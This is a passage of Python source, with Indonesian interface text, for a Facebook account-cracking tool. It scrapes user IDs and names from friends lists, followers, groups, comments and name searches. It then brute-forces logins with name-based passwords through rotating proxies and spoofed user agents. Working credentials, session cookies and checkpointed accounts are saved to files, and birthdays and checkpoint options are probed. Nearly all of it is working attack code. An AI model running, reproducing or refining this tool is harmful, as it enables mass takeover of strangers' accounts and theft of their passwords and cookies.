	except:sys.exit(f" [{M}>{P}] Tidak Ada Hasil OK...Makanya Ganteng")
	for x in ok:
		nom.append(x)
		no+=1
		try:jum= open('OK/'+x,'r').readlines()
		except:continue
		print(f' [{hh}{no}{P}] {x} - {hh}{len(jum)} {P}akun')	
	exc = input(f' [{hh}<{P}] Nomor File Yang Akan Di Cek\n File : ')
	xxx = input(' Simpan Akun Tidak Kenon Ke File Apa : \n Nama : ')
	nonon = xxx+'.txt'
	file = nom[int(exc)-1]
	print(' ─────────────────────────────')
	print(f' Akun Tidak Kenon Di : {nonon}\n Akun Yang Kenon Di  : Buang Lah Goblok')
	print(' ─────────────────────────────')
	try:
		uuid = open('OK/'+file,'r').read().splitlines()
		mek = 0
		for data in uuid:
			print(f'\r [{hh}>{P}] Aman : {nga} Down : {sesi}',end='')
			sys.stdout.flush()
			try:user,nama = data.split('|')
			except:exit(f" [{M}>{P}] Pemisah Salah")
			xx = open(nonon,'a')
			try:
				mek+=1
				na = ses.get(f'https://graph.facebook.com/{user}?access_token={t}',cookies=c).json()['name']
				print(f'\r [{hh}{mek}{P}] {user}|{nama}                    ')
				nga+=1
				ni = f'{user}|{nama}\n'
				xx.write(ni)
			except:
				print(f'\r [{M}{mek}{P}] {user}|{nama}                  ')
				sesi+=1
	except Exception as e :
		exit(f" [{M}>{P}] File Tidak Ada")
		
		
###---[CEK HASIL CRACK ]---###
def cek_hasil():
	no,nom = 0,[]
	one = input(f' [{hh}1{P}] Cek Hasil Akun OK\n [{hh}2{P}] Cek Hasil Akun CP\n Menu : ')
	if one in ['1','01']:
		try:ok = os.listdir('OK')
		except:sys.exit(f" [{M}>{P}] Tidak Ada hasil OK")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('OK/'+x,'r').readlines()
			except:continue
			print(f' [{hh}{no}{P}] {x} - {hh}{len(jum)} {P}Akun')	
		abc = input(f' [{hh}<{P}] Nomor File : ')
		file = nom[int(abc)-1]
		try:buka = open('OK/'+file,'r').read()
		except:sys.exit(f" [{M}>{P}] File Tidak Ada Hasil OK")
		print(hh+buka+P)
	elif one in ['2','02']:
		try:ok = os.listdir('CP')
		except:sys.exit(f" [{M}>{P}] Tidak Ada Hasil CP")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('CP/'+x,'r').readlines()
			except:continue
			print(f' [{kk}{no}{P}] {x} - {kk}{len(jum)} {P}Akun')		
		abc = input(f' [{hh}<{P}] Nomor File : ')
		file = nom[int(abc)-1]
		try:buka = open('CP/'+file,'r').read()
		except:sys.exit(f" [{M}>{P}] File Tidak Ada Hasil CP")
		print(kk+buka+P)
	else:sys.exit(f" [{M}>{P}] Isi Yang Benar")
		
###---[ DUMP EMAIL ]---###
def clon_email():
	rc = random.choice
	rr = random.randint
	bas = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	print(f' [{hh}>{P}] Dump Dari Email, Max 2000 ID')
	nama = input(' Masukan Nama : ')
	if ',' in str(nama):
		exit(f' [{M}<{P}] Masukan 1 Nama Saja')
	doma = input(' Masukan Domain Contoh @gmail.com : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f' [{M}<{P}] Masukan Domain Yang Benar')
	jumlah = input(' Total  : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in dump:pass
		else:dump.append(D+'|'+nama)
		if len(dump)==2000:atur_atur()
		print('\r Sedang Dump %s ID'%(len(dump)),end='')
		sys.stdout.flush()
	atur_atur()	

def crack_file():
	file = input(f' [{hh}<{P}] Masukan Nama File Dump\n File : ')
	try:
		uuid = open(file,'r').readlines()
		for data in uuid:
			try:user,nama = data.split('|')
			except:exit(f" [{M}>{P}] Pemisah Salah")
			dump.append(data)
			print('\r Sedang Dump %s ID'%(len(dump)),end=" ")
			sleep(0.0000003)
	except FileNotFoundError:exit(f" [{M}>{P}] File Tidak Ada")
	print(f'\r [{hh}<{P}] Total Jumlah Akun Adalah {len(dump)}')
	atur_atur()
	
def crack_search():
	nama = []
	custom = [" muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya "]
	custom2 = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak "]
	print(f' [{hh}<{P}] 1 Nama Setara Dengan...Pikir Sendiri Lah')
	nam = input(f' Nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=35) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	atur_atur()
		
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in dump:pass
			else:dump.append(bo)
	try:
		link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
		if(link):
			print('\r Sedang Dump %s ID'%(len(dump)),end=" ")
			sys.stdout.flush()
			cari_nama(link)
	except:pass
	

def crack_komen():
	ide = input(f' [{hh}<{P}] Masukan ID Postingan Public\n ID Post : ')
	url = 'https://mbasic.facebook.com/'+ide
	try:get_komen(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f' [{M}>{P}] Gagal Dump Comment')
	atur_atur()

def get_komen(url):
	data = parser(ses.get(url).text,"html.parser")
	for isi in data.find_all("h3"):
		for ids in isi.find_all("a",href=True):
			if "profile.php" in ids.get("href"):id = ids.get("href").split('=')[1].replace("&refid","")
			else:id = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
			nama = ids.text
			if id+"|"+nama in dump:pass
			else:dump.append(id+"|"+nama)
			print(f'\r Sedang Dump {len(dump)} ID ',end='');sys.stdout.flush()
	for z in data.find_all("a",href=True):
		if "Lihat Komentar Sebelumnya…" in z.text:
			try:get_komen("https://mbasic.facebook.com"+z["href"])
			except:pass
			
			
	
###---[ DUMP LOGIN ]---###
def crack_publik(t,c):
	akun = input(f' [{hh}<{P}] MAKE SURE THE ACCOUNT IS PUBLIC \n ID : ')
	try:
		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(id,name,username)&access_token={t}',cookies=c).json()
		for pi in bas['friends']['data']:
			try:
				try:dump.append(pi['username']+'|'+pi['name'])
				except:dump.append(pi['id']+'|'+pi['name'])
				print('\r Sedang Dump %s ID'%(len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		atur_atur()
	except (KeyError,IOError):
		exit(f" [{M}>{P}] Akun Tidak Publik")	


def crack_masal(t,c):
    print(f' [{hh}<{P}] MAKE SURE THE ACCOUNT IS PUBLIC ')
    try:
        bz=0
        apa = int(input(f' TOTAL ID : '))
    except:apa=1
    for bz in range(apa):
    	bz +=1
    	akun = input(f'\r ID {bz} : ')
    	try:
    		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(name,username,id)&access_token={t}',cookies=c).json()
    		for pi in bas['friends']['data']:
    		      try:dump.append(pi['username']+'|'+pi['name'])
    		      except:dump.append(pi['id']+'|'+pi['name'])
    		      print('\r sedang dump %s id'%(len(dump)),end=" ")
    		      sys.stdout.flush()
    		      time.sleep(0.0002)
    	except:
    		print(f"\r [{kk}!{P}] Akun Tidak Publik       ")
    		continue	                       		
    atur_atur()
    
    
def crack_foll(t,c):
	akun = input(f' [{hh}<{P}] Pastikan Akun Bersifat Publik \n Akun : ')
	try:
		bas = ses.get(f"https://graph.facebook.com/{akun}?fields=name,subscribers.fields(id,username,name).limit(1000000000)&access_token={t}",cookies=c).json()
		for pi in bas["subscribers"]["data"]:
			try:
				try:dump.append(pi['username']+'|'+pi['name'])
				except:dump.append(pi['id']+'|'+pi['name'])
				print('\r sedang dump %s id'%(len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		atur_atur()
	except (KeyError,IOError):
		exit(f" [{M}>{P}] Akun Tidak Publik")
		
def crack_group():
	link = input(f' [{hh}<{P}] Pastikan Group Bersifat Publik \n ID Group : ')
	url = "https://mbasic.facebook.com/groups/"+link
	try:dump_grup(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f' [{M}>{P}] Gagal Dump ID Group')
	atur_atur()

def dump_grup(url):
	try:
		data = parser(ses.get(url, headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1; A1601 Build LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/E7FBAF"}).text, "html.parser")
		for x in data.find_all("table"):
			par = x.text
			if ">" in par.split(" ") or "Mengajukan" in par.split(" "):
				id = re.findall("content_owner_id_new.\w+",str(x))[0].replace("content_owner_id_new.","")
				if " Mengajukan Pertanyaan ." in par:nama = par.replace(" Mengajukan Pertanyaan .","")
				else:nama = par.split(" > ")[0]
				if id+"|"+nama in dump:pass
				else:dump.append(id+"|"+nama)
				print(f'\r Sedang Dump {len(dump)} ID ',end='');sys.stdout.flush()
		for z in data.find_all("a"):
			if "Lihat Postingan Lainnya</span" in str(z).split(">"):
				href = str(z).replace('<a href="','').replace("amp;","").split(" ")[0].replace('"><span>Lihat','')
				dump_grup("https://mbasic.facebook.com"+href)
	except:dump_grup(url)
		
		
###---[ ATUR SEBELUM CRACK ]---###
akunok = []
def atur_atur():
	print(f"\r{P} ─────────────────────────────")
	ro = input(f' [{hh}1{P}] MOBILE [{hh}2{P}] MBASIC [{hh}3{P}] FREE : ')
	if ro in ['1','01']:metode.append('Mobile')
	elif ro in ['2','02']:metode.append('Mbasic')
	elif ro in ['3','03']:metode.append('Free')
	else:metode.append('mobile')
	print(f"{P} ─────────────────────────────")
	ch = input(f' [{hh}RANDOM{P}] O / N / R: ')
	if ch in ['o','O']:
		for x in dump:
			id.append(x)
	elif ch in ['n','N']:
		for x in dump:
			id.insert(0,x)
	elif ch in ['r','R']:
		for x in dump:
			xx = random.randint(0,len(id))
			id.insert(xx,x)
	else:
		for x in dump:
			id.append(x)
	print(f"{P} ─────────────────────────────")
	cp = input(f' [{hh}!{P}] VIEW OPTION CHECKPOINT : N/Y ')
	if cp in ['y','Y','ya','Ya','1','01','yy','YA','yA']:
		cepeh.append('ya')
	print(f"{P} ─────────────────────────────")
	apk = input(f' [{hh}!{P}] VIEW APPLICATION : N/Y ')
	if apk in ['y','Ya','ya','1']:akunok.append('apk')
	else:akunok.append('coki')
	print(f"{P} ─────────────────────────────")
	ch = input(f' [{hh}1{P}] MANUAL [{hh}2{P}] COMBINE [{hh}3{P}] DEFAULT : ')
	if ch in ['1','01']:manual()
	elif ch in ['2','02']:gabung()
	elif ch in ['3','03']:otomatis()
	else:otomatis()
	
from datetime import datetime    	
###---[ ATUR SANDI ]---###
def manual():
	global ok,cp
	pwx = []
	print(f"{P} ─────────────────────────────")
	B = input(f' [{hh}>{P}] Input Sandi Manual 6 Kata\n Sandi  : ').split(',')
	for x in B:
		pwx.append(x)
	print(f"{P} ─────────────────────────────")
	print(f' Akun OK Di : {sim_ok}\n Akun CP Di : {sim_cp}')
	print(f"{P} ─────────────────────────────")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}<{P}] Brute Force Telah Selesai Jumlah OK:{ok} Jumlah CP:{cp} ')


def gabung():
	global ok,cp
	pwx = []
	A = ["123456"]
	print(f"{P} ─────────────────────────────")
	B = input(f' [{hh}>{P}] Input Sandi Manual 6 Kata\n Sandi  : ').split(',')
	C = input(f' [{hh}>{P}] Input Sandi Belakang Nama\n Sandi  : ')
	if ',' in str(C):
		exit(f" [{M}>{P}] sandi belakang satu kata saja")
	print(f"{P} ─────────────────────────────")
	print(f' Akun OK Di : {sim_ok}\n Akun CP Di : {sim_cp}')
	print(f"{P} ─────────────────────────────")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = A+B
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
					pwx.append(depan+C)
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"123")
							pwx.append(tengah+"12345")
							pwx.append(tengah+C)
							pwx.append(nama)
					except:
						pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"123")
					pwx.append(depan+"12345")
					pwx.append(depan+C)
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}<{P}] crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
				

def otomatis():
	global ok,cp
	print(f"{P} ─────────────────────────────")
	print(f' {H}SAVE OK : {sim_ok}\n {K}SAVE CP : {sim_cp}')
	print(f"{P} ─────────────────────────────")
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = []
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
					pwx.append(depan+"123")
					pwx.append(depan+"1234")
					pwx.append(depan+"12345")
			else:
				if len(depan)<=1 or len(depan)<=2:
					try:
						tengah = nama.split(" ")[1]
						if len(tengah)<=3:
							pass
						else:
							pwx.append(tengah+"123")
							pwx.append(tengah+"1234")
							pwx.append(tengah+"12345")
							pwx.append(nama)
					except:
						try:
							belakang = nama.split(' ')[2]
							if len(belakang)<=3:pass
							else:
								pwx.append(belakang+"123")
								pwx.append(belakang+"1234")
								pwx.append(belakang+"12345")
								pwx.append(nama)
						except:pwx.append(nama)
				else:
					pwx.append(nama)
					pwx.append(depan+"123")
					pwx.append(depan+"1234")
					pwx.append(depan+"12345")
			if 'mobile' in metode:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
			elif 'mbasic' in metode:
				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)
			elif 'free' in metode:
				babas.submit(crack,idf,pwx,"free.facebook.com",awal)
			else:
				babas.submit(crack,idf,pwx,"m.facebook.com",awal)
	sleep(5)
	exit(f'\r [{hh}<{P}] Brute Force Telah Selesai Jumlah OK:{ok} Jumlah CP:{cp} ')
	#os.popen('play-audio data/selesai.mp3')
				

###---[ MENU CRACK ]---###
resok = []
rescp = []
def crack(idf,pwx,url,awal):
	global loop,ok,cp
	ses = requests.Session()
	xx = open('.proxy.txt','r').read().splitlines()
	ua = random.choice(redmi)
	proxy = {'http': 'socks5://'+random.choice(xx)}
	ahir = str(datetime.now()-awal).split('.')[0]
	print(f"\r {ahir} %s/%s OK:%s CP:%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
			ses.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 8A Pro Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e8cf7e-d665-4088-9570-0eb586cc4ed4%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATD5nHC4edOMoAzC8J17lYNyHSaLUR2HV5zxWLj0OjpodHV6r6u1_gCAISpijfm0EFoQUtn16BBW8Ah2aCj5H-X0CqVofDKDRqent4fe7YA50B-ui6Mq7kTGmIp_j1U5triydjrynmOXjAhTHJR5SSfBL30-ua5TBgcJtlRgULcIHPOohSl0sQUgpvsMzAUZbSzoholY9NsYWIckn9Bq_3qfn4mtCqfPBIMJqzmPv7Qv0WacvuLDiJMhce4-3JjE8FE9m3H-nKlFSSDGVyhCTxUN0PCgiCIq1yyJhuKqlNx4aUb2kKZuPrMm4545MVT2e580DRuJYeeGuR8RqxrJ8XgtPViKGnd7XFO48NO6XhIivpaogF9BpRvn1FzNZMnVCSBZ0qI4aquNupeiwZ0ItZFVhSf2KqKkHInuvpCJ4PwZtbnRPR9jk3ZnFFb3M9puqmB47R1RaWz2y-icx8T0kiwGk-SEMtU9T3wWoxa2BbobbQL3GBt09IW2oQRiLHcb7LiYxFQoiiiroczxA4WwFrXsS2D0Hl_ZrpB5aLA-rgW080lvxV8iEYO61gj1xTMpqXF5zKz9VjE_qL0TQzK5bgaMJpywnt8TMFte0GU5C-nnDrtJQrMsVH6vMGHi0zqbtT51Cotl9FIfm9GE3Czegn7Hmrms0uDqxnFpQc0CuDs%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
			head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
			bx = ses.post(f"https://{url}/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=date, headers=head,proxies=proxy)
			if "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				data = (f'{idf}|{pw}')
				if data in rescp:pass
				else:
					rescp.append(data)
					cp+=1
					if 'ya' in cepeh:
						cek_opsi(idf,pw,ua)
					else:
						try:
							token = open('.token.txt','r').read()
							bas = {"cookie":open('.cookie.txt','r').read()}
							ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
							m, d, y = ttl.split('/')
							m = tete[m]
							print(f'\r├── Email  : {kk}{idf}{P}          \n│   └──  Sandi  : {kk}{pw}          {P}\n└── User Agent  : {kk}{ua}{P}\n')
							sapi = f'{idf}|{pw}|{d} {m} {y}'
							open('CP/'+sim_cp,'a').write(sapi+'\n')
							break
						except:
							print(f'\n├── Email  : {kk}{idf}{P}          \n│   └──  Sandi  : {kk}{pw}          {P}\n└── User Agent  : {kk}{ua}{P}\n')
							os.popen
							open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
							break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				data = (f'{idf}|{pw}')
				if data in resok:pass
				else:
					resok.append(data)
					ok+=1
					open('OK/'+sim_ok,'a').write(data+'\n')
					if "coki" in akunok:
						print(f'\r├── Email & Sandi : {hh}{idf}|{pw}{P}          \n│   └──  Cookies  : {hh}{kuki}          {P}\n└──  User Agent : {hh}{ua}{P}\n')
						os.popen
						break
					elif "apk" in akunok:
						cek_apk(idf,pw,kuki)
						break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
		#except Exception as e:print(e)
	loop+=1
	

###---[ CEK OPSI AKUN CP ]---###
opsi = []
def sesi(res):
	response = parser(res,'html.parser')
	form = response.find('form',{'method':'post'})
	data = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['hidden','submit']})}
	r = parser(ses.post('https://mbasic.facebook.com'+form.get('action'),data=data).text, 'html.parser')
	for i in r.find_all('option'):
		opsi.append(i.text)
	return opsi		

def cek_opsi(idf,pw,ua):
	akun = ''
	try:
		token = open('.token.txt','r').read()
		bas = {"cookie":open('.cookie.txt','r').read()}
		ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
		m, d, y = ttl.split('/')
		m = tete[m]
		akun += f' [{kk}>{P}] Email  : {kk}{idf}{P}          \n [{kk}>{P}] Sandi  : {kk}{pw}          {P}\n [{kk}>{P}] TTL  : {kk}{d} {m} {y}{P}           '
		mek = f"{idf}|{pw}|{day} {month} {year}"
		if 'file' in detek:pass
		else:open('CP/'+sim_cp,'a').write(mek+'\n')
	except:
		month = ""
		day = ""
		year = ""
		akun += f' [{kk}>{P}] Email  : {kk}{idf}{P}          \n [{kk}>{P}] Sandi  : {kk}{pw}          {P}'
		if 'file' in detek:pass
		else:open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
	try:
		h2 = {'host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent': ua}
		res = ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr',headers=h2).text
		ress = parser(res, 'html.parser')
		form = ress.find('form',{'method':'post'})
		data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}
		data2.update({
					'email':idf,
					'pass':pw})
		res = ses.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text
		ress = parser(res, 'html.parser')
		if 'Lihat Detail Login Yang Di Tampilkan. Ini Anda?' in str(ress.find('title').text):
			akun += f'\n [{hh}>{P}] {hh} Akun Tap Yes🎉{P}                       '
		else:
			if(len(sesi(res))==0):
				if 'Masukkan Kode Masuk untuk Melanjutkan' in str(ress.find('title').text):
					akun += f'\n [{kk}>{P}] A2F                     '
				else:
					cok = convert(ses.cookies.get_dict())
					akun += f'\n [{hh}>{P}] Akun Tidak Checkpoint                       \n [{hh}>{P}] Cookie : {cok}'
			else:
				akun += f'\n [{kk}>{P}] Terdapat {len(opsi)} Opsi :                     '
				o = 0
				for cp in opsi:
					o+=1
					akun += f'\n [{kk}{o}{P}] {cp}               '
		opsi.clear()
	except Exception as e:
		akun += f'\n [{M}>{P}] Kata Sandi Salah / Spam                      '
	print('\r'+ akun)
	print('\r                                                                       ')
		
				
###---[ CONVERT COOKIE ]---###
def convert(cookie):
